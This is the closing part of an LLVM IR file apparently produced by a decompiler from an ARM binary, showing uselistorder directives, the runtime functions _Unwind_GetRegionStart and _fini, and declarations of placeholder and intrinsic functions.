753, 1256, 637, 1257, 971, 415, 419, 420, 421, 418, 414, 417, 416, 1258, 1259, 1260, 754, 1261, 755, 639, 638, 756, 1262, 757, 1263, 972, 170, 173, 174, 175, 172, 167, 171, 168, 169, 1264, 1265, 1266, 1267, 1268, 758, 1269, 759, 1270, 760, 644, 643, 761, 1271, 640, 1272, 641, 1273, 642, 1274, 978, 977, 976, 975, 974, 973, 238, 239, 241, 240, 237, 243, 242, 1275, 1276, 1277, 1278, 1279, 762, 1280, 763, 1281, 764, 653, 652, 765, 1282, 651, 1283, 650, 1284, 645, 1285, 646, 1286, 647, 1287, 648, 1288, 649, 1289, 984, 983, 982, 981, 980, 979, 405, 406, 408, 407, 404, 409, 410, 1298, 1299, 1300, 1301, 1302, 628, 629, 766, 1303, 1304, 767, 1305, 1306, 768, 1307, 1309, 1308, 988, 987, 986, 985, 262, 263, 265, 266, 267, 261, 264, 268, 1311, 1312, 1313, 769, 770, 990, 989, 254, 257, 258, 253, 256, 255, 1314, 1315, 1316, 771, 656, 655, 772, 1317, 654, 1318, 991, 378, 379, 383, 384, 385, 382, 381, 380, 1319, 1320, 1321, 773, 659, 658, 774, 1322, 657, 1323, 996, 995, 994, 993, 992, 305, 306, 311, 310, 312, 309, 307, 304, 308, 1326, 1327, 1328, 775, 1329, 776, 661, 660, 777, 1330, 997, 318, 321, 322, 323, 320, 316, 319, 317, 1331, 1332, 778, 1333, 662, 616, 779, 998, 286, 287, 1335, 1336, 780, 1337, 663, 617, 781, 999, 288, 289, 1344, 664, 782, 1000, 346, 347, 348, 1348, 1001, 374, 1353, 1002, 249, 1390, 1393, 783, 1394, 1395, 1391, 1392, 1396, 1397, 227, 228, 230, 229, 226, 231, 1403, 784, 1003, 313, 1404, 224, 1004, 1005, 551 }
}

define i32 @_Unwind_GetRegionStart(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_1a750 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_1a758 = add i32 %tmp1, 72
  %v2_1a758 = inttoptr i32 %v1_1a758 to i32*
  %v3_1a758 = load i32, i32* %v2_1a758, align 4
  ret i32 %v3_1a758

; uselistorder directives
  uselistorder i32 72, { 12, 13, 0, 14, 2, 3, 1, 4, 9, 10, 6, 7, 11, 8, 5 }
  uselistorder i32 (i32, i32, i32, i32, i8*)* @_Unwind_VRS_Get, { 10, 8, 7, 6, 5, 9, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 3, 4, 7, 5, 6, 1, 2, 8, 14, 13, 10, 11, 9, 12, 15, 16, 17 }
  uselistorder i32 12, { 8, 7, 10, 9, 170, 171, 172, 173, 14, 15, 61, 16, 174, 53, 11, 175, 176, 177, 178, 179, 181, 182, 180, 183, 184, 185, 186, 187, 188, 189, 17, 18, 19, 20, 22, 21, 23, 54, 55, 24, 25, 56, 57, 58, 59, 60, 62, 63, 86, 64, 65, 190, 5, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 3, 124, 125, 126, 127, 128, 26, 129, 147, 27, 28, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 166, 159, 160, 161, 162, 163, 164, 165, 167, 168, 29, 169, 4, 87, 88, 30, 89, 90, 91, 31, 66, 39, 42, 49, 50, 67, 51, 68, 40, 41, 38, 43, 44, 45, 46, 47, 48, 52, 69, 70, 71, 6, 72, 73, 74, 75, 77, 78, 80, 79, 32, 81, 33, 82, 34, 83, 85, 84, 76, 121, 92, 93, 35, 94, 95, 96, 36, 97, 98, 99, 100, 101, 102, 12, 103, 104, 105, 106, 107, 108, 13, 109, 110, 37, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 122, 123, 0, 1, 2 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_1a76c = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_1a76c)
  %v31_1a774 = load i32, i32* @r0, align 4
  ret i32 %v31_1a774

; uselistorder directives
  uselistorder i32* @r0, { 13, 14, 15, 237, 238, 239, 16, 19, 78, 89, 240, 243, 244, 69, 17, 241, 242, 219, 45, 8, 245, 9, 18, 79, 0, 80, 10, 11, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 1, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 81, 41, 70, 71, 72, 73, 74, 75, 76, 77, 82, 83, 84, 85, 86, 87, 88, 20, 235, 21, 236, 22, 23, 24, 25, 161, 162, 272, 273, 275, 57, 58, 59, 60, 26, 193, 194, 2, 27, 28, 91, 92, 3, 29, 30, 276, 277, 4, 31, 32, 202, 203, 5, 33, 34, 66, 67, 274, 146, 90, 221, 35, 54, 55, 222, 6, 223, 224, 225, 213, 52, 214, 215, 216, 53, 217, 218, 36, 233, 226, 227, 228, 229, 230, 231, 232, 93, 94, 204, 37, 205, 209, 38, 210, 189, 39, 190, 95, 40, 96, 211, 48, 212, 97, 42, 43, 163, 164, 165, 166, 98, 44, 99, 46, 47, 167, 168, 169, 170, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 63, 130, 64, 61, 62, 65, 131, 134, 135, 136, 137, 138, 139, 132, 133, 50, 140, 141, 142, 143, 144, 145, 68, 147, 148, 51, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 171, 172, 173, 174, 175, 176, 177, 12, 178, 179, 180, 181, 182, 183, 184, 206, 207, 7, 185, 186, 187, 188, 191, 192, 195, 196, 197, 198, 199, 200, 201, 208, 220, 234, 56, 49 }
  uselistorder void (i32)* @__pseudo_branch, { 1, 68, 61, 62, 63, 64, 65, 66, 67, 69, 70, 71, 72, 17, 18, 19, 20, 21, 22, 13, 14, 15, 16, 23, 24, 25, 26, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 27, 28, 29, 73, 78, 79, 80, 81, 82, 83, 84, 74, 88, 89, 90, 91, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 39, 75, 76, 77, 85, 86, 87, 40, 41, 42, 0, 36, 37, 38, 43, 47, 48, 44, 45, 46, 92, 30, 31, 32, 33, 34, 35, 59, 60 }
  uselistorder i32 0, { 507, 506, 570, 571, 1776, 511, 510, 572, 1777, 1778, 1779, 1780, 459, 458, 573, 1781, 1782, 207, 1783, 1785, 1786, 150, 151, 1787, 1788, 1784, 95, 96, 97, 98, 2, 1, 3, 0, 196, 195, 197, 198, 199, 1789, 508, 509, 142, 137, 1790, 1791, 201, 202, 200, 203, 1792, 1793, 1794, 1795, 206, 205, 204, 1796, 1797, 1798, 498, 497, 574, 512, 575, 513, 576, 514, 577, 578, 579, 152, 1799, 528, 527, 1800, 1801, 526, 525, 1802, 580, 523, 524, 521, 522, 520, 519, 1803, 518, 517, 516, 515, 468, 1804, 1820, 1805, 210, 1806, 1807, 1808, 1809, 1810, 1811, 212, 1813, 1814, 208, 209, 1815, 1816, 128, 153, 1817, 1818, 763, 99, 100, 499, 500, 211, 1812, 1819, 467, 1821, 581, 582, 1822, 530, 529, 213, 1823, 1824, 214, 1825, 1826, 1827, 111, 583, 584, 1828, 215, 1829, 154, 1830, 1831, 216, 1832, 1833, 1834, 1835, 1836, 1837, 1838, 1839, 1840, 1841, 38, 129, 585, 1842, 217, 1843, 1844, 1845, 4, 1846, 1847, 5, 1848, 1849, 975, 976, 6, 143, 1850, 586, 1851, 889, 890, 891, 892, 893, 897, 894, 895, 896, 7, 469, 101, 898, 587, 899, 900, 901, 531, 532, 977, 978, 8, 588, 834, 589, 1852, 1853, 1854, 9, 10, 155, 156, 157, 1869, 1870, 11, 835, 158, 159, 1686, 1687, 1688, 1689, 218, 219, 1690, 844, 220, 130, 48, 1871, 102, 470, 1875, 1876, 49, 902, 112, 903, 904, 905, 471, 160, 1872, 1873, 1874, 472, 12, 1877, 1878, 1879, 1880, 1881, 1884, 1885, 1886, 1887, 1888, 1889, 1890, 1891, 1892, 1893, 1882, 1883, 1894, 1895, 1896, 1897, 1898, 1899, 1900, 1901, 39, 1902, 1903, 1904, 1905, 1906, 40, 1907, 1908, 1909, 41, 1910, 1911, 1912, 42, 1913, 1914, 1915, 1916, 1917, 1918, 1919, 1920, 1921, 1922, 1923, 1924, 1925, 1926, 1927, 1928, 1929, 1930, 1931, 1932, 1933, 1934, 1935, 1936, 1939, 1940, 1941, 1942, 1943, 1944, 1945, 1937, 1938, 1946, 1947, 1948, 1949, 1950, 1951, 1952, 1953, 1954, 1955, 43, 1956, 1957, 1958, 1959, 1960, 44, 1961, 1962, 1963, 1964, 1965, 45, 1966, 1967, 1968, 1969, 1970, 1971, 1972, 1973, 1974, 1975, 1976, 1977, 1978, 1979, 1980, 221, 906, 764, 907, 908, 909, 910, 944, 590, 591, 945, 946, 161, 162, 163, 225, 911, 223, 912, 933, 926, 765, 927, 928, 929, 930, 50, 51, 115, 931, 932, 473, 934, 935, 766, 936, 222, 937, 52, 53, 114, 938, 939, 767, 940, 941, 54, 55, 113, 942, 224, 943, 164, 913, 768, 914, 915, 592, 916, 917, 769, 918, 919, 922, 920, 921, 474, 923, 56, 57, 117, 924, 770, 58, 59, 116, 925, 947, 771, 948, 949, 950, 951, 952, 953, 772, 954, 955, 956, 957, 837, 836, 477, 839, 840, 838, 475, 476, 841, 842, 593, 843, 845, 846, 773, 847, 848, 849, 774, 850, 851, 60, 61, 118, 852, 853, 854, 103, 104, 855, 856, 857, 226, 858, 859, 860, 861, 862, 594, 863, 864, 865, 866, 867, 868, 165, 871, 775, 872, 873, 62, 63, 120, 874, 875, 876, 776, 877, 878, 879, 880, 777, 881, 882, 64, 65, 119, 883, 884, 885, 886, 887, 227, 229, 869, 228, 870, 230, 888, 166, 958, 963, 964, 959, 960, 961, 966, 967, 968, 231, 969, 970, 971, 972, 973, 962, 965, 974, 167, 979, 980, 981, 595, 1425, 596, 982, 1855, 1856, 1857, 232, 1858, 1751, 1750, 1694, 1667, 1533, 984, 983, 985, 1426, 1427, 1428, 1981, 1982, 1983, 1984, 233, 1985, 1986, 1987, 1695, 1696, 495, 496, 597, 1992, 781, 1993, 598, 1994, 1995, 599, 1996, 1997, 779, 234, 479, 1998, 780, 1999, 600, 105, 2000, 2001, 601, 2016, 2017, 2020, 778, 478, 2021, 533, 169, 168, 2018, 2019, 1988, 1989, 782, 235, 460, 825, 13, 14, 2012, 1557, 989, 2011, 1634, 1752, 138, 1753, 783, 236, 1754, 1755, 2002, 2003, 2004, 2005, 602, 2006, 170, 1389, 1390, 66, 67, 121, 1756, 1757, 110, 481, 1761, 1758, 1759, 784, 1760, 1762, 785, 1763, 1764, 1765, 1766, 68, 69, 122, 1767, 237, 1768, 1769, 1770, 1772, 1771, 480, 826, 828, 827, 238, 829, 830, 831, 603, 832, 171, 1990, 1991, 1391, 1392, 1393, 1394, 1395, 1396, 240, 172, 1397, 1398, 1399, 139, 239, 1400, 173, 605, 606, 2007, 604, 174, 175, 1702, 1703, 1704, 1705, 1706, 241, 1707, 1708, 1709, 1710, 1711, 1712, 1713, 242, 1697, 607, 1698, 1699, 608, 1700, 1701, 176, 786, 243, 244, 1668, 609, 245, 1669, 1670, 1671, 1672, 1673, 250, 247, 255, 249, 254, 253, 248, 252, 251, 246, 1714, 1715, 1739, 1740, 177, 1716, 1717, 259, 257, 258, 1718, 1719, 265, 264, 192, 256, 1720, 1721, 1722, 1723, 1724, 1725, 502, 501, 534, 610, 1726, 1727, 1728, 106, 1729, 261, 260, 262, 263, 191, 1730, 1731, 482, 1732, 1733, 147, 1734, 1735, 1736, 1737, 1738, 15, 16, 990, 991, 107, 17, 535, 611, 1657, 1635, 1637, 1636, 1659, 1658, 1535, 1534, 993, 992, 1401, 994, 995, 1661, 1660, 1662, 1691, 2022, 2023, 123, 178, 1429, 1430, 1431, 266, 986, 987, 179, 267, 1432, 1437, 1438, 1439, 1440, 268, 1433, 269, 1434, 1435, 787, 1441, 1402, 612, 1536, 2008, 2009, 2010, 996, 998, 997, 1442, 999, 1773, 1000, 1001, 1002, 2013, 2014, 2015, 1436, 18, 1859, 1860, 1861, 144, 1862, 1863, 1864, 1865, 1866, 270, 1867, 788, 791, 789, 790, 1868, 792, 193, 271, 1443, 1444, 140, 492, 1445, 1446, 793, 19, 483, 272, 273, 274, 70, 275, 613, 1003, 1447, 1448, 1449, 1676, 1675, 1677, 1678, 1679, 1680, 46, 276, 1681, 1682, 1683, 277, 131, 132, 568, 569, 988, 279, 278, 280, 1450, 281, 1451, 1452, 282, 1741, 1742, 614, 283, 1453, 284, 285, 1588, 286, 1558, 1011, 1004, 287, 288, 818, 819, 821, 1005, 306, 1006, 1007, 796, 806, 807, 808, 797, 809, 810, 798, 811, 820, 812, 133, 71, 463, 464, 813, 799, 814, 800, 815, 801, 816, 802, 817, 822, 823, 615, 824, 1008, 794, 1009, 616, 1010, 485, 484, 1012, 1013, 1014, 1015, 308, 307, 1016, 1017, 1018, 803, 461, 1019, 124, 125, 462, 1020, 126, 127, 617, 1021, 1022, 1024, 1025, 795, 1026, 1027, 1028, 1029, 1030, 618, 1031, 1032, 94, 145, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 309, 1041, 1042, 1043, 1044, 1045, 310, 1046, 1047, 1048, 1049, 1050, 1051, 311, 1052, 1053, 312, 1054, 1055, 313, 1056, 1057, 1058, 72, 1059, 1060, 1061, 1062, 314, 1063, 1064, 1065, 315, 1066, 180, 181, 1067, 1068, 1069, 316, 1070, 1071, 1072, 1073, 317, 1074, 1075, 1076, 1077, 289, 1078, 1079, 1080, 318, 1081, 1082, 1083, 1084, 319, 1085, 1086, 1087, 1088, 1089, 320, 1090, 1091, 1092, 1093, 321, 1094, 1095, 1096, 1097, 322, 1098, 1099, 1100, 1101, 323, 1102, 1103, 1104, 1105, 324, 1106, 1107, 1108, 1109, 1110, 325, 1111, 1112, 1113, 1114, 326, 1115, 1116, 1117, 1118, 327, 1119, 1120, 1121, 1122, 328, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 290, 1140, 1141, 1142, 1143, 329, 1144, 1145, 1146, 1147, 330, 1148, 291, 331, 1149, 1150, 332, 1151, 292, 333, 1152, 1153, 334, 1154, 182, 183, 1155, 1156, 1157, 335, 1158, 1159, 1160, 1161, 336, 1162, 1163, 1164, 1165, 337, 1166, 1167, 1168, 1169, 293, 1170, 1171, 1172, 1173, 294, 1174, 1175, 1176, 1177, 338, 1178, 1179, 1180, 1181, 1182, 339, 1183, 1184, 1185, 1186, 295, 1187, 1188, 1189, 1190, 340, 1191, 1192, 1193, 1194, 341, 1195, 1196, 1197, 296, 1198, 1199, 1200, 1201, 342, 1202, 1203, 1204, 1205, 297, 1206, 1207, 1208, 298, 1209, 1210, 1211, 1212, 343, 1213, 1214, 1215, 1216, 299, 1217, 1218, 1219, 1220, 344, 1221, 1222, 1223, 1224, 345, 1225, 1226, 1227, 1228, 346, 1229, 300, 347, 1230, 1231, 301, 1232, 1233, 1234, 1235, 348, 1236, 1237, 1238, 1239, 349, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 302, 1247, 1248, 1249, 303, 1250, 1251, 1252, 1253, 350, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 351, 1269, 1270, 1271, 1272, 352, 1273, 1274, 353, 1275, 1276, 354, 1277, 1278, 1279, 355, 1280, 1281, 1282, 356, 1283, 1284, 1285, 357, 1286, 1287, 358, 1288, 1289, 1290, 359, 1291, 1292, 360, 1293, 1294, 361, 1295, 1296, 1297, 1298, 362, 1299, 1300, 363, 1301, 1302, 364, 1303, 1304, 365, 1305, 1306, 366, 1307, 1308, 367, 1309, 1310, 1311, 368, 1312, 304, 369, 1313, 1314, 1315, 370, 1316, 149, 184, 1317, 1318, 305, 1319, 1320, 371, 1321, 1322, 372, 1323, 1324, 1325, 1326, 373, 1327, 1328, 1329, 1330, 374, 1331, 1332, 1333, 1334, 375, 1335, 1336, 376, 1337, 1338, 377, 1339, 1340, 1341, 1342, 378, 1343, 379, 1344, 1345, 1346, 1347, 1348, 1349, 1350, 1351, 1352, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 1367, 1368, 619, 620, 1369, 621, 1370, 1373, 1374, 380, 1371, 381, 1372, 382, 1023, 1559, 1560, 1375, 383, 1376, 1377, 1378, 1379, 1380, 1381, 1382, 466, 465, 1383, 622, 1384, 623, 1385, 624, 1386, 503, 1387, 625, 1388, 1403, 1404, 1405, 388, 387, 804, 185, 805, 386, 385, 384, 487, 493, 626, 1406, 389, 390, 1414, 1407, 1408, 1409, 1410, 1411, 1412, 1413, 486, 627, 1415, 628, 1416, 629, 1417, 630, 1418, 631, 1419, 1420, 632, 1421, 1422, 1423, 73, 1424, 391, 633, 141, 1454, 1455, 1456, 1457, 490, 1458, 1459, 1460, 489, 1461, 1462, 1463, 1464, 392, 1465, 1467, 1466, 186, 187, 393, 488, 395, 394, 1468, 396, 397, 108, 398, 1469, 401, 1470, 1471, 1472, 1473, 400, 399, 402, 1474, 1475, 74, 75, 188, 1476, 1477, 20, 21, 22, 23, 1478, 1479, 403, 537, 1480, 634, 1481, 635, 1482, 636, 1483, 637, 1484, 638, 1485, 639, 1486, 536, 1487, 407, 1489, 1490, 1491, 1492, 405, 404, 408, 1493, 1494, 76, 77, 1488, 406, 1496, 1495, 24, 25, 26, 27, 1497, 409, 1498, 1499, 539, 1500, 640, 1501, 641, 1502, 642, 1503, 643, 1504, 644, 1505, 645, 1506, 538, 1507, 646, 1508, 413, 1510, 1511, 1512, 1513, 411, 410, 414, 1514, 1515, 78, 79, 1509, 412, 1516, 80, 647, 1517, 1519, 1520, 1521, 1522, 648, 1523, 28, 29, 30, 31, 32, 1518, 415, 1524, 1525, 545, 1526, 544, 1527, 543, 1528, 542, 1529, 540, 1530, 541, 1531, 649, 1532, 419, 1538, 1539, 1540, 1541, 417, 416, 420, 1542, 1543, 81, 82, 1537, 418, 1544, 83, 650, 1545, 1547, 1548, 1549, 1550, 651, 1551, 33, 34, 35, 36, 37, 1546, 421, 1552, 1553, 547, 1554, 546, 1555, 652, 1556, 424, 1561, 1562, 1563, 1564, 423, 422, 425, 1565, 1566, 84, 85, 194, 146, 426, 109, 654, 1567, 1568, 1569, 1570, 1571, 427, 1572, 1573, 550, 1574, 1575, 1576, 1577, 431, 428, 429, 430, 1578, 1579, 1580, 1581, 655, 1582, 1583, 549, 1584, 653, 1585, 548, 1586, 656, 1587, 433, 1589, 1590, 1591, 1592, 432, 434, 1593, 1594, 86, 87, 134, 1595, 435, 1596, 1597, 553, 1598, 551, 1599, 552, 1600, 1603, 1604, 1605, 437, 438, 1606, 1607, 88, 1601, 1602, 436, 1609, 1608, 1610, 439, 1611, 1612, 556, 1613, 555, 1614, 554, 1615, 657, 1616, 1618, 1619, 1620, 441, 442, 443, 1622, 1623, 89, 1621, 1617, 440, 1625, 1626, 1624, 1627, 444, 1628, 1629, 559, 1630, 558, 1631, 557, 1632, 658, 1633, 448, 1639, 1640, 1641, 1642, 447, 446, 449, 1643, 1644, 90, 91, 1638, 445, 1645, 1646, 450, 1647, 1648, 562, 1649, 561, 1650, 560, 1651, 659, 1652, 661, 135, 92, 1653, 189, 563, 662, 663, 1654, 1655, 451, 452, 1656, 660, 665, 136, 93, 1663, 190, 564, 666, 1664, 1665, 453, 454, 1666, 664, 504, 1674, 1684, 455, 1685, 1692, 456, 1693, 1743, 148, 1744, 1745, 505, 667, 491, 1746, 1747, 47, 494, 1748, 1749, 668, 1774, 457, 1775, 2024, 565, 833, 566, 567, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 2025, 2026, 2027, 2028, 2029, 2030, 2031, 2032, 2033, 2034, 2035, 2036, 2037, 2038, 2039 }
  uselistorder i32* @r4, { 94, 821, 822, 823, 824, 825, 843, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 10, 840, 841, 842, 844, 845, 846, 847, 848, 849, 850, 851, 101, 102, 103, 104, 147, 11, 148, 149, 150, 12, 151, 152, 153, 154, 155, 156, 157, 0, 13, 158, 159, 160, 161, 162, 163, 164, 165, 224, 225, 852, 95, 96, 97, 854, 855, 856, 5, 859, 57, 853, 740, 741, 105, 106, 107, 108, 109, 110, 111, 112, 113, 860, 861, 166, 167, 14, 4, 168, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 15, 169, 170, 171, 172, 173, 174, 175, 176, 195, 16, 196, 197, 177, 178, 180, 17, 181, 184, 18, 185, 186, 19, 187, 188, 20, 189, 190, 21, 191, 192, 22, 193, 54, 194, 179, 198, 23, 199, 200, 201, 202, 203, 204, 205, 182, 183, 98, 99, 100, 58, 114, 115, 116, 117, 24, 118, 25, 26, 119, 120, 121, 122, 123, 124, 125, 130, 131, 27, 132, 133, 28, 134, 135, 29, 136, 137, 30, 138, 139, 31, 140, 141, 32, 142, 143, 126, 127, 128, 129, 144, 145, 146, 206, 207, 208, 33, 209, 210, 211, 34, 212, 213, 214, 215, 216, 217, 52, 218, 219, 220, 221, 222, 223, 226, 227, 228, 229, 345, 230, 857, 858, 803, 804, 805, 806, 807, 808, 704, 705, 346, 347, 878, 879, 880, 745, 746, 56, 884, 53, 885, 886, 887, 903, 905, 906, 907, 904, 888, 893, 901, 902, 881, 894, 895, 896, 897, 59, 809, 810, 6, 35, 811, 36, 812, 813, 814, 889, 890, 815, 86, 87, 88, 89, 90, 91, 882, 883, 891, 892, 231, 232, 233, 234, 747, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 37, 763, 764, 765, 766, 748, 749, 750, 706, 707, 708, 709, 710, 711, 712, 713, 714, 38, 715, 716, 717, 718, 719, 720, 721, 722, 723, 767, 789, 790, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 55, 781, 782, 1, 783, 784, 785, 786, 787, 788, 238, 239, 240, 60, 639, 640, 641, 642, 643, 646, 647, 648, 644, 645, 678, 679, 680, 681, 682, 683, 684, 61, 492, 493, 494, 497, 498, 499, 495, 496, 241, 242, 243, 244, 245, 246, 247, 62, 248, 249, 63, 685, 686, 687, 688, 689, 690, 691, 348, 349, 350, 351, 352, 353, 354, 235, 236, 237, 355, 356, 357, 358, 9, 359, 360, 361, 362, 363, 364, 365, 250, 251, 252, 255, 256, 257, 253, 254, 258, 259, 260, 261, 262, 263, 898, 899, 900, 264, 265, 266, 366, 367, 368, 369, 370, 267, 582, 583, 541, 542, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 268, 269, 270, 271, 66, 67, 64, 65, 68, 69, 70, 71, 72, 73, 74, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 291, 292, 293, 300, 301, 302, 303, 304, 305, 7, 306, 294, 295, 296, 297, 298, 299, 287, 288, 289, 290, 692, 693, 543, 544, 545, 546, 547, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 92, 39, 40, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 371, 372, 8, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 41, 389, 42, 390, 43, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 44, 415, 45, 416, 46, 417, 47, 418, 419, 420, 421, 48, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 49, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 50, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 649, 650, 51, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 2, 671, 672, 673, 674, 675, 676, 677, 694, 695, 696, 3, 697, 698, 699, 700, 701, 702, 703, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 742, 743, 744, 791, 792, 795, 793, 794, 796, 797, 798, 799, 800, 801, 802, 816, 817, 818, 819, 93, 820 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare i64* @__decompiler_undefined_function_5() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_6() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_13.3 @__decompiler_undefined_function_8() local_unnamed_addr

declare %anon_struct_13 @__decompiler_undefined_function_9() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
